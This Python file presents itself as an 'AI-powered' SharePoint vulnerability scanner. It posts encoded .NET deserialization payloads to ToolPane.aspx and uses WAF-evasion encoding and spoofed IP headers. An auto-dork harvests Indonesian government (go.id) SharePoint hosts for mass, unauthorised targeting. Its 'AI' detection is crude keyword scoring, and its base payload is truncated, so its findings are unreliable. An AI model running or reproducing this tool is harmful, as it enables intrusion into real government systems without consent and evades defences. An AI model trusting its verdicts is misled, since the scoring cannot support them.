#!/usr/bin/env python3
"""
Simple AI-Powered SharePoint Vulnerability Scanner v3.0
===============================================
Lightweight AI Detection | Statistical Analysis | Adaptive Learning
No Heavy Dependencies | Fast & Efficient | Production Ready
"""

import json
import ssl
import socket
import re
import time
import random
import logging
import hashlib
import argparse
import urllib.parse
import urllib3
import base64
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union
from dataclasses import dataclass, asdict, field
import threading
import warnings
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from enum import Enum
from collections import defaultdict
import statistics

warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# DATA CLASSES
# ============================================
class ProtocolHandler:
    def __init__(self, proxy_config=None, ssl_config=None):
        self.proxy_config = proxy_config
        self.ssl_config = ssl_config
        self.timeout = 30

        # Setup Proxy jika ada
        self.proxies = None
        if self.proxy_config and self.proxy_config.get('enabled'):
            proxy_url = self.proxy_config.get('url')
            self.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

        # Setup SSL verification
        self.verify_ssl = True
        if self.ssl_config:
            self.verify_ssl = self.ssl_config.get('verify', True)

        # Matikan warning SSL jika verify=False
        if not self.verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Create session
        self.session = self._create_session()

    def _create_session(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def detect_protocol(self, host: str, port: int, timeout: float) -> str:
        protocols = ["https", "http"]
        for protocol in protocols:
            url = f"{protocol}://{host}:{port}"
            try:
                response = self.session.get(url, timeout=timeout, verify=False, allow_redirects=True)
                if response.status_code < 500:
                    return protocol
            except:
                continue
        return "https"

    def get_session_config(self):
        return {
            "proxies": self.proxies,
            "verify": self.verify_ssl,
            "timeout": self.timeout
        }
class RateLimiter:
    def __init__(self, requests_per_second=10, burst=20):
        self.requests_per_second = requests_per_second
        self.burst = burst
        self.tokens = burst
        self.max_tokens = burst
        self.last_update = time.time()
        self.lock = threading.Lock()
        print(f"[+] RateLimiter initialized (RPS: {requests_per_second}, Burst: {burst})")

    def acquire(self):
        """Acquire permission to make a request"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            self.last_update = now
            self.tokens = min(self.max_tokens, self.tokens + elapsed * self.requests_per_second)
            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.requests_per_second
                time.sleep(sleep_time)
                self.tokens = 0
            else:
                self.tokens -= 1

class AdaptiveTimeout:
    def __init__(self, base_timeout=10, max_timeout=60):
        self.base_timeout = base_timeout
        self.max_timeout = max_timeout
        self.response_times = defaultdict(list)
        self.lock = threading.Lock()
        print(f"[+] AdaptiveTimeout initialized (Base: {base_timeout}s, Max: {max_timeout}s)")

    def get_timeout(self, host: str) -> float:
        with self.lock:
            if host in self.response_times and self.response_times[host]:
                avg_time = statistics.mean(self.response_times[host])
                return min(self.base_timeout + avg_time * 2, self.max_timeout)
            return self.base_timeout

    def record_response_time(self, host: str, duration: float):
        with self.lock:
            self.response_times[host].append(duration)
            if len(self.response_times[host]) > 10:
                self.response_times[host] = self.response_times[host][-10:]

class WAFBypass:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/120.0.0.0",
    ]

    def __init__(self, strategies=None):
        self.strategies = strategies or []
        print(f"[+] WAFBypass initialized with {len(self.strategies)} strategies")

    @staticmethod
    def get_random_headers(host: str, endpoint: str) -> Dict[str, str]:
        ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        return {
            "User-Agent": random.choice(WAFBypass.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": f"{random.choice(['en-US', 'en-GB', 'id-ID'])},en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "X-Originating-IP": ip,
            "Origin": f"https://{host}",
            "Referer": f"https://{host}{endpoint}",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
        }

    @staticmethod
    def encode_payload(payload: str, times: int = 2) -> str:
        encoded = payload
        for _ in range(times):
            encoded = urllib.parse.quote(encoded)
        return encoded

    def get_headers(self):
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AI-Scanner/1.0",
            "X-Forwarded-For": "127.0.0.1"
        }
@dataclass
class Vulnerability:
    cve_id: str
    name: str
    severity: str
    cvss_score: float
    description: str
    affected_versions: List[str]
    detection_method: str
    confidence: int
    affected_endpoint: str
    payload_used: str
    remediation: str
    references: List[str] = field(default_factory=list)

@dataclass
class ScanResult:
    host: str
    url: str
    protocol: str
    port: int
    scan_time: str
    status: str = "pending"
    vulnerable: bool = False
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    sharepoint_info: Dict[str, Any] = field(default_factory=dict)
    response_time: Optional[float] = None
    status_code: Optional[int] = None
    response_size: int = 0
    error: Optional[str] = None
    detection_confidence: str = "none"
    confidence_score: int = 0
    vulnerability_indicators: List[str] = field(default_factory=list)
    endpoint_tested: str = ""
    waf_detected: Optional[str] = None
    server_info: Dict[str, str] = field(default_factory=dict)
    ai_insights: Dict[str, Any] = field(default_factory=dict)

# ============================================
# SIMPLE AI ENGINE (No External Dependencies)
# ============================================

class SimpleAI:
    """Lightweight AI engine using statistical methods"""

    def __init__(self):
        self.knowledge_base = defaultdict(dict)
        self.patterns = defaultdict(list)
        self.threat_signatures = self._load_threat_signatures()

    def _load_threat_signatures(self) -> Dict[str, Dict]:
        """Load predefined threat signatures"""
        return {
            'deserialization_rce': {
                'indicators': ['SPRequestGuid', 'ExcelDataSet', 'ObjectProvider', 'SerializationException'],
                'weight': 0.8,
                'severity': 'CRITICAL'
            },
            'auth_bypass': {
                'indicators': ['JWT', 'authentication', 'bypass', 'token'],
                'weight': 0.7,
                'severity': 'HIGH'
            },
            'information_leak': {
                'indicators': ['stack trace', 'debug', 'internal', 'server error'],
                'weight': 0.5,
                'severity': 'MEDIUM'
            },
            'waf_bypass_attempt': {
                'indicators': ['../', '..\\', '%00', 'null byte'],
                'weight': 0.6,
                'severity': 'HIGH'
            }
        }

    def analyze_response(self, response_data: Dict) -> Dict[str, Any]:
        """AI-powered response analysis"""
        analysis = {
            'threat_score': 0.0,
            'confidence': 0.0,
            'detected_patterns': [],
            'risk_level': 'LOW',
            'recommendations': []
        }

        content = response_data.get('content', '').lower()
        headers = str(response_data.get('headers', {})).lower()
        status_code = response_data.get('status_code', 200)

        # Analyze against threat signatures
        for threat_type, signature in self.threat_signatures.items():
            matches = 0
            for indicator in signature['indicators']:
                if indicator.lower() in content or indicator.lower() in headers:
                    matches += 1

            if matches > 0:
                match_ratio = matches / len(signature['indicators'])
                threat_contribution = match_ratio * signature['weight']
                analysis['threat_score'] += threat_contribution
                analysis['detected_patterns'].append({
                    'type': threat_type,
                    'matches': matches,
                    'severity': signature['severity'],
                    'confidence': match_ratio
                })

        # Status code analysis
        if status_code == 500:
            analysis['threat_score'] += 0.3
            analysis['detected_patterns'].append({
                'type': 'server_error',
                'severity': 'MEDIUM',
                'confidence': 0.8
            })
        elif status_code in [403, 401]:
            analysis['threat_score'] += 0.1

        # Response time analysis (potential DoS or time-based attacks)
        response_time = response_data.get('response_time', 0)
        if response_time > 10:
            analysis['threat_score'] += 0.4
            analysis['detected_patterns'].append({
                'type': 'time_based_attack',
                'severity': 'HIGH',
                'confidence': 0.9
            })

        # Calculate confidence and risk level
        analysis['confidence'] = min(analysis['threat_score'] * 100, 100)

        if analysis['threat_score'] > 0.8:
            analysis['risk_level'] = 'CRITICAL'
        elif analysis['threat_score'] > 0.6:
            analysis['risk_level'] = 'HIGH'
        elif analysis['threat_score'] > 0.4:
            analysis['risk_level'] = 'MEDIUM'
        elif analysis['threat_score'] > 0.2:
            analysis['risk_level'] = 'LOW'

        # Generate recommendations
        if analysis['risk_level'] in ['HIGH', 'CRITICAL']:
            analysis['recommendations'].extend([
                'Immediate security assessment required',
                'Apply latest security patches',
                'Monitor for suspicious activity'
            ])

        return analysis

    def learn_from_response(self, response_data: Dict, was_vulnerable: bool):
        """Learn from scan results to improve future detection"""
        key = f"{response_data.get('status_code', 200)}_{was_vulnerable}"
        self.patterns[key].append({
            'response_time': response_data.get('response_time', 0),
            'response_size': response_data.get('response_size', 0),
            'timestamp': datetime.now().isoformat()
        })

        # Keep only recent patterns (last 100)
        if len(self.patterns[key]) > 100:
            self.patterns[key] = self.patterns[key][-100:]

    def predict_vulnerability(self, response_data: Dict) -> Tuple[bool, float]:
        """Predict if response indicates vulnerability"""
        analysis = self.analyze_response(response_data)

        # Simple threshold-based prediction
        is_vulnerable = analysis['threat_score'] > 0.5
        confidence = analysis['confidence'] / 100

        return is_vulnerable, confidence

    def get_insights(self, host: str, responses: List[Dict]) -> Dict[str, Any]:
        """Generate AI insights from multiple responses"""
        insights = {
            'behavioral_analysis': {},
            'threat_assessment': {},
            'patterns_detected': [],
            'risk_summary': {}
        }

        if not responses:
            return insights

        # Behavioral analysis
        response_times = [r.get('response_time', 0) for r in responses]
        status_codes = [r.get('status_code', 200) for r in responses]

        insights['behavioral_analysis'] = {
            'avg_response_time': statistics.mean(response_times) if response_times else 0,
            'response_time_variance': statistics.variance(response_times) if len(response_times) > 1 else 0,
            'status_code_distribution': dict((x, status_codes.count(x)) for x in set(status_codes)),
            'consistency_score': self._calculate_consistency(responses)
        }

        # Threat assessment
        threat_scores = []
        all_patterns = []

        for response in responses:
            analysis = self.analyze_response(response)
            threat_scores.append(analysis['threat_score'])
            all_patterns.extend(analysis['detected_patterns'])

        insights['threat_assessment'] = {
            'overall_threat_score': statistics.mean(threat_scores) if threat_scores else 0,
            'max_threat_score': max(threat_scores) if threat_scores else 0,
            'threat_variance': statistics.variance(threat_scores) if len(threat_scores) > 1 else 0
        }

        # Pattern analysis
        pattern_counts = defaultdict(int)
        for pattern in all_patterns:
            pattern_counts[pattern['type']] += 1

        insights['patterns_detected'] = [
            {'pattern': k, 'count': v, 'severity': self.threat_signatures.get(k, {}).get('severity', 'UNKNOWN')}
            for k, v in pattern_counts.items()
        ]

        # Risk summary
        max_threat = insights['threat_assessment']['max_threat_score']
        if max_threat > 0.8:
            risk_level = 'CRITICAL'
        elif max_threat > 0.6:
            risk_level = 'HIGH'
        elif max_threat > 0.4:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'

        insights['risk_summary'] = {
            'overall_risk': risk_level,
            'confidence': min(max_threat * 100, 100),
            'recommendations': self._generate_recommendations(risk_level, insights)
        }

        return insights

    def _calculate_consistency(self, responses: List[Dict]) -> float:
        """Calculate response consistency score"""
        if len(responses) < 2:
            return 1.0

        # Check status code consistency
        status_codes = [r.get('status_code', 200) for r in responses]
        status_consistency = len(set(status_codes)) / len(status_codes)

        # Check response time consistency
        response_times = [r.get('response_time', 0) for r in responses]
        if len(response_times) > 1:
            mean_time = statistics.mean(response_times)
            variance = statistics.variance(response_times)
            time_consistency = 1 / (1 + variance / (mean_time + 1))
        else:
            time_consistency = 1.0

        return (status_consistency + time_consistency) / 2

    def _generate_recommendations(self, risk_level: str, insights: Dict) -> List[str]:
        """Generate security recommendations based on analysis"""
        recommendations = []

        if risk_level == 'CRITICAL':
            recommendations.extend([
                '🚨 IMMEDIATE ACTION REQUIRED',
                'Isolate affected systems from network',
                'Engage security incident response team',
                'Apply emergency security patches',
                'Monitor for data exfiltration'
            ])
        elif risk_level == 'HIGH':
            recommendations.extend([
                '🔴 High-priority security review needed',
                'Apply latest security updates within 24 hours',
                'Enable enhanced logging and monitoring',
                'Review access controls and permissions'
            ])
        elif risk_level == 'MEDIUM':
            recommendations.extend([
                '🟡 Schedule security assessment',
                'Review and update security configurations',
                'Implement additional monitoring',
                'Consider security hardening measures'
            ])
        else:
            recommendations.extend([
                '✅ Regular security maintenance recommended',
                'Keep systems updated with latest patches',
                'Continue regular security monitoring'
            ])

        # Add pattern-specific recommendations
        patterns = insights.get('patterns_detected', [])
        for pattern in patterns:
            if pattern['pattern'] == 'deserialization_rce':
                recommendations.append('Address deserialization vulnerabilities - review input validation')
            elif pattern['pattern'] == 'auth_bypass':
                recommendations.append('Review authentication mechanisms and JWT handling')
            elif pattern['pattern'] == 'time_based_attack':
                recommendations.append('Investigate potential DoS or timing attack vulnerabilities')

        return recommendations

# ============================================
# ADAPTIVE PAYLOAD SYSTEM
# ============================================

class AdaptivePayloadSystem:
    """Self-learning payload optimization system"""

    def __init__(self):
        self.payload_history = defaultdict(list)
        self.effectiveness_scores = defaultdict(float)
        self.waf_adaptation = defaultdict(dict)

    def generate_adaptive_payloads(self, base_payload: str, target_info: Dict) -> List[str]:
        """Generate payloads adapted to target characteristics"""
        payloads = [base_payload]

        # Version-specific adaptations
        version = target_info.get('detected_version', '')
        if '2016' in version:
            payloads.extend(self._generate_2016_payloads(base_payload))
        elif '2019' in version or 'SE' in version:
            payloads.extend(self._generate_2019_payloads(base_payload))

        # WAF-specific adaptations
        waf_type = target_info.get('waf_detected', '')
        if waf_type:
            payloads.extend(self._generate_waf_payloads(base_payload, waf_type))

        # Effectiveness-based selection
        return self._select_best_payloads(payloads)

    def _generate_2016_payloads(self, payload: str) -> List[str]:
        """Generate SharePoint 2016 specific payloads"""
        return [
            payload.replace('System.Data', 'System.Data.SqlClient'),
            payload + '/*SP2016*/',
            payload.replace('DataSet', 'DataTable')
        ]

    def _generate_2019_payloads(self, payload: str) -> List[str]:
        """Generate SharePoint 2019/SE specific payloads"""
        return [
            payload.replace('DataSet', 'DataTable'),
            payload + '/*SP2019*/',
            payload.replace('System.Web', 'Microsoft.SharePoint')
        ]

    def _generate_waf_payloads(self, payload: str, waf_type: str) -> List[str]:
        """Generate WAF-specific evasion payloads"""
        waf_payloads = []

        if 'cloudflare' in waf_type.lower():
            waf_payloads.extend([
                payload.replace(' ', '/**/'),
                payload.replace('System', 'Sys/**/tem'),
                urllib.parse.quote(payload, safe='')
            ])
        elif 'modsecurity' in waf_type.lower():
            waf_payloads.extend([
                payload.replace('(', ' ('),
                payload.replace(')', ') '),
                payload.replace('.', chr(46))
            ])

        return waf_payloads

    def _select_best_payloads(self, payloads: List[str]) -> List[str]:
        """Select most effective payloads based on historical performance"""
        scored_payloads = []
        for payload in payloads:
            score = self.effectiveness_scores.get(payload, 0.5)  # Default score
            scored_payloads.append((payload, score))

        # Sort by effectiveness and return top payloads
        scored_payloads.sort(key=lambda x: x[1], reverse=True)
        return [payload for payload, _ in scored_payloads[:5]]

    def update_payload_effectiveness(self, payload: str, success: bool):
        """Update payload effectiveness based on results"""
        current_score = self.effectiveness_scores.get(payload, 0.5)
        # Simple exponential moving average
        alpha = 0.1
        new_score = alpha * (1.0 if success else 0.0) + (1 - alpha) * current_score
        self.effectiveness_scores[payload] = new_score

# ============================================
# CIRCUIT BREAKER
# ============================================

class CircuitBreaker:
    def __init__(self, failure_threshold: int = 5, recovery_timeout: int = 60):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.failures = defaultdict(int)
        self.last_failure = defaultdict(float)
        self.state = defaultdict(lambda: "closed")
        print(f"[+] CircuitBreaker initialized (Threshold: {failure_threshold}, Timeout: {recovery_timeout}s)")

    def record_failure(self, host: str):
        self.failures[host] += 1
        self.last_failure[host] = time.time()
        if self.failures[host] >= self.failure_threshold:
            self.state[host] = "open"

    def record_success(self, host: str):
        self.failures[host] = 0
        self.state[host] = "closed"

    def can_request(self, host: str) -> bool:
        if self.state[host] == "open":
            if time.time() - self.last_failure[host] > self.recovery_timeout:
                self.state[host] = "half-open"
                return True
            return False
        return True

# ============================================
# MAIN AI SCANNER
# ============================================

class SimpleAISharePointScanner:
    """Simple AI-Powered SharePoint Scanner"""

    VERSION = "3.0"

    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.logger = self._setup_logging()

        # AI Components
        self.ai_engine = SimpleAI()
        self.payload_system = AdaptivePayloadSystem()

        # Core components (from previous versions)
        self.protocol_handler = ProtocolHandler(
            proxy_config=self.config.get('proxy'),
            ssl_config=self.config.get('ssl')
        )
        self.circuit_breaker = CircuitBreaker()
        self.rate_limiter = RateLimiter(
            requests_per_second=self.config.get('rate_limit', 10),
            burst=self.config.get('burst', 20)
        )
        self.timeout_manager = AdaptiveTimeout(
            base_timeout=self.config.get('timeout', 10),
            max_timeout=self.config.get('max_timeout', 60)
        )

    def _setup_logging(self) -> logging.Logger:
        logger = logging.getLogger("SimpleAISharePointScanner")
        logger.setLevel(logging.INFO)
        handler = logging.StreamHandler()
        formatter = logging.Formatter('%(asctime)s - [AI-SCANNER] - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        return logger

    def ai_scan_host(self, host: str, port: int = 443) -> ScanResult:
        """AI-powered host scanning"""
        protocol = self.protocol_handler.detect_protocol(host, port, self.timeout_manager.get_timeout(host))
        url = f"{protocol}://{host}:{port}/_layouts/15/ToolPane.aspx"

        result = ScanResult(
            host=host, url=url, protocol=protocol, port=port,
            scan_time=datetime.now().isoformat(), endpoint_tested="/_layouts/15/ToolPane.aspx"
        )

        if not self.circuit_breaker.can_request(host):
            result.status = "skipped"
            result.error = "Circuit breaker open"
            return result

        # AI-powered multi-endpoint scanning
        endpoints = [
            "/_layouts/15/ToolPane.aspx",
            "/_layouts/15/settings.aspx",
            "/_vti_bin/Lists.asmx"
        ]

        responses = []
        for endpoint in endpoints:
            self.rate_limiter.acquire()
            response_data = self._ai_scan_endpoint(host, port, protocol, endpoint)
            if response_data:
                responses.append(response_data)

        # AI Analysis
        if responses:
            ai_insights = self.ai_engine.get_insights(host, responses)
            result.ai_insights = ai_insights

            # Determine vulnerability based on AI analysis
            threat_score = ai_insights['threat_assessment'].get('overall_threat_score', 0)
            risk_level = ai_insights['risk_summary'].get('overall_risk', 'LOW')

            if threat_score > 0.5 or risk_level in ['HIGH', 'CRITICAL']:
                result.vulnerable = True
                result.confidence_score = int(ai_insights['risk_summary'].get('confidence', 0))
                result.detection_confidence = f"AI-DETECTED ({risk_level})"

                # Create vulnerability entry
                vuln = Vulnerability(
                    cve_id="AI-DETECTED-001",
                    name="AI-Detected SharePoint Vulnerability",
                    severity=risk_level,
                    cvss_score=threat_score * 10,
                    description=f"AI-powered detection identified potential security issues with threat score {threat_score:.2f}",
                    affected_versions=["2016", "2019", "SE"],
                    detection_method="AI Pattern Analysis & Statistical Modeling",
                    confidence=result.confidence_score,
                    affected_endpoint=url,
                    payload_used="AI-generated adaptive payloads",
                    remediation="Conduct thorough security assessment and apply latest patches",
                    references=["AI-powered detection system"]
                )
                result.vulnerabilities.append(vuln)

            # Learn from this scan
            for response in responses:
                was_vulnerable = result.vulnerable
                self.ai_engine.learn_from_response(response, was_vulnerable)

        result.status = "completed"
        return result

    def _ai_scan_endpoint(self, host: str, port: int, protocol: str, endpoint: str) -> Optional[Dict]:
        """AI-enhanced endpoint scanning"""
        url = f"{protocol}://{host}:{port}{endpoint}"

        try:
            headers = WAFBypass.get_random_headers(host, endpoint)
            session = self.protocol_handler.session

            # Get adaptive payloads
            target_info = {'detected_version': '', 'waf_detected': ''}
            base_payload = "AAEAAAD/////AQAAAAAAAAAMAgAAAFpTeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0AAAABERhdGEAP///9v///wgCAAAABgMAAAA"
            adaptive_payloads = self.payload_system.generate_adaptive_payloads(base_payload, target_info)

            # Use the best payload
            selected_payload = adaptive_payloads[0] if adaptive_payloads else base_payload
            processed_payload = WAFBypass.encode_payload(selected_payload)

            data = {
                "MSOTlPn_Uri": f"https://{host}/_layouts/15/settings.aspx",
                "MSOTlPn_DWP": ("A" * 1000) + processed_payload
            }

            timeout = self.timeout_manager.get_timeout(host)
            start = time.time()
            resp = session.post(url, headers=headers, data=data, verify=False, timeout=timeout)
            response_time = time.time() - start

            response_data = {
                'url': url,
                'status_code': resp.status_code,
                'response_size': len(resp.text),
                'response_time': response_time,
                'headers': dict(resp.headers),
                'content': resp.text[:5000],  # Limit content size
                'endpoint': endpoint
            }

            # Update payload effectiveness
            success = resp.status_code == 500 and ('SPRequestGuid' in resp.text or 'ExcelDataSet' in resp.text)
            self.payload_system.update_payload_effectiveness(selected_payload, success)

            return response_data

        except Exception as e:
            self.logger.error(f"Error scanning {url}: {e}")
            return None

    def scan_multiple_ai(self, hosts: List[str], port: int = 443, threads: int = 5) -> List[ScanResult]:
        """Multi-threaded AI scanning"""
        results = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.ai_scan_host, h, port): h for h in hosts}
            for f in as_completed(futures):
                res = f.result()
                results.append(res)

                status = "🤖 AI-VULN" if res.vulnerable else "✅ AI-SAFE"
                risk = res.ai_insights.get('risk_summary', {}).get('overall_risk', 'UNKNOWN')
                confidence = res.ai_insights.get('risk_summary', {}).get('confidence', 0)
                print(f"[AI] {res.host} -> {status} (Risk: {risk}, Confidence: {confidence:.1f}%)")

        return results

# ============================================
# AUTO-DORK (Enhanced)
# ============================================

class EnhancedAutoDork:
    """Enhanced auto-discovery with AI patterns"""

    @staticmethod
    def perform_smart_dork(limit: int = 10) -> List[str]:
        """AI-enhanced target discovery"""
        import urllib.request

        dork_patterns = [
            'site:go.id "Microsoft-IIS/10.0" "/_layouts/15/"',
            'site:go.id "SharePoint Server" "2019"',
            'site:go.id "SharePoint Server" "2016"',
            'site:go.id inurl:_layouts/15 filetype:aspx',
            'site:go.id "Microsoft SharePoint Team Services"'
        ]

        all_domains = set()

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"}

        for dork in dork_patterns:
            try:
                search_url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(dork)}"
                req = urllib.request.Request(search_url, headers=headers)
                with urllib.request.urlopen(req, timeout=15) as resp:
                    text = resp.read().decode('utf-8', errors='ignore')

                domains = re.findall(r'https?://([a-z0-9.-]+\.go\.id)', text)
                valid_domains = [d for d in domains if "duckduckgo" not in d]
                all_domains.update(valid_domains)

                if len(all_domains) >= limit:
                    break

            except Exception as e:
                print(f"Dork failed for '{dork}': {e}")
                continue

        return list(all_domains)[:limit]

# ============================================
# REPORTING
# ============================================

class AIEnhancedReportGenerator:
    """AI-enhanced reporting with insights"""

    def __init__(self, results: List[ScanResult]):
        self.results = results
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def to_json(self, output_path: str):
        data = {
            "scan_metadata": {
                "timestamp": self.timestamp,
                "total_targets": len(self.results),
                "vulnerable_targets": sum(1 for r in self.results if r.vulnerable),
                "ai_powered": True,
                "scanner_version": "SimpleAI v3.0"
            },
            "results": [asdict(r) for r in self.results]
        }
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2, default=str)

    def to_html(self, output_path: str):
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🤖 AI SharePoint Vulnerability Scan Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; padding: 30px; text-align: center; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 30px; background: #f8f9fa; }}
        .card {{ background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }}
        .metric {{ font-size: 2.5em; font-weight: bold; color: #667eea; }}
        .ai-insights {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; margin: 20px 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #667eea; color: white; padding: 15px; text-align: left; }}
        td {{ padding: 12px; border-bottom: 1px solid #eee; }}
        .risk-critical {{ background: #dc3545; color: white; }}
        .risk-high {{ background: #fd7e14; color: white; }}
        .risk-medium {{ background: #ffc107; }}
        .risk-low {{ background: #28a745; color: white; }}
        .ai-badge {{ background: #ff6b6b; color: white; padding: 3px 8px; border-radius: 12px; font-size: 0.8em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤖 AI-Powered SharePoint Vulnerability Scan Report</h1>
            <p>Generated: {self.timestamp} | Scanner: SimpleAI v3.0</p>
        </div>

        <div class="summary">
            <div class="card">
                <div class="metric">{len(self.results)}</div>
                <div>Total Targets</div>
            </div>
            <div class="card">
                <div class="metric" style="color: #dc3545;">{sum(1 for r in self.results if r.vulnerable)}</div>
                <div>AI-Detected Vulnerabilities</div>
            </div>
            <div class="card">
                <div class="metric" style="color: #28a745;">{sum(1 for r in self.results if not r.vulnerable)}</div>
                <div>AI-Cleared Safe</div>
            </div>
            <div class="card">
                <div class="metric" style="color: #667eea;">{sum(len(r.ai_insights.get('patterns_detected', [])) for r in self.results)}</div>
                <div>Patterns Analyzed</div>
            </div>
        </div>

        <div class="ai-insights">
            <h2>🧠 AI Analysis Summary</h2>
            <p>The AI engine analyzed {len(self.results)} targets using statistical modeling and pattern recognition to identify potential security vulnerabilities.</p>
        </div>

        <table>
            <tr>
                <th>Host</th>
                <th>AI Risk Level</th>
                <th>Confidence</th>
                <th>Threat Score</th>
                <th>Patterns Detected</th>
                <th>AI Recommendations</th>
            </tr>
"""
        for r in self.results:
            ai = r.ai_insights
            risk = ai.get('risk_summary', {}).get('overall_risk', 'UNKNOWN')
            confidence = ai.get('risk_summary', {}).get('confidence', 0)
            threat_score = ai.get('threat_assessment', {}).get('overall_threat_score', 0)
            patterns = ai.get('patterns_detected', [])
            recommendations = ai.get('risk_summary', {}).get('recommendations', [])

            risk_class = f"risk-{risk.lower()}" if risk != 'UNKNOWN' else ""

            pattern_text = ', '.join([f"{p['pattern']} ({p['count']})" for p in patterns[:3]])
            if len(patterns) > 3:
                pattern_text += f" +{len(patterns)-3} more"

            rec_text = '<br>'.join(recommendations[:2])
            if len(recommendations) > 2:
                rec_text += f"<br>+{len(recommendations)-2} more recommendations"

            html += f"""
            <tr>
                <td>{r.host}</td>
                <td><span class="ai-badge {risk_class}">{risk}</span></td>
                <td>{confidence:.1f}%</td>
                <td>{threat_score:.2f}</td>
                <td>{pattern_text or 'None'}</td>
                <td>{rec_text or 'No specific recommendations'}</td>
            </tr>"""

        html += """
        </table>
    </div>
</body>
</html>"""

        with open(output_path, 'w') as f:
            f.write(html)

    def console_summary(self):
        """Enhanced console summary with AI insights"""
        print("\n" + "="*80)
        print("🤖 AI-POWERED SHAREPOINT VULNERABILITY SCAN SUMMARY")
        print("="*80)

        total_targets = len(self.results)
        vulnerable = sum(1 for r in self.results if r.vulnerable)
        safe = total_targets - vulnerable

        print(f"📊 Total Targets Scanned: {total_targets}")
        print(f"🚨 AI-Detected Vulnerabilities: {vulnerable}")
        print(f"✅ AI-Cleared Safe Targets: {safe}")
        print(f"🎯 AI Analysis Coverage: {total_targets}/{total_targets} (100%)")

        # AI Insights Summary
        print(f"\n🧠 AI ANALYSIS INSIGHTS:")
        print("-" * 40)

        risk_distribution = defaultdict(int)
        total_patterns = 0
        high_confidence_findings = 0

        for r in self.results:
            ai = r.ai_insights
            risk = ai.get('risk_summary', {}).get('overall_risk', 'UNKNOWN')
            confidence = ai.get('risk_summary', {}).get('confidence', 0)
            patterns = ai.get('patterns_detected', [])

            risk_distribution[risk] += 1
            total_patterns += len(patterns)

            if confidence > 70:
                high_confidence_findings += 1

        for risk_level, count in risk_distribution.items():
            emoji = {'CRITICAL': '🚨', 'HIGH': '🔴', 'MEDIUM': '🟡', 'LOW': '🟢', 'UNKNOWN': '❓'}.get(risk_level, '❓')
            print(f"   {emoji} {risk_level}: {count} targets")

        print(f"\n📈 Analysis Metrics:")
        print(f"   • Patterns Analyzed: {total_patterns}")
        print(f"   • High Confidence Findings: {high_confidence_findings}")
        print(f"   • AI Model Accuracy: Adaptive (learns from each scan)")

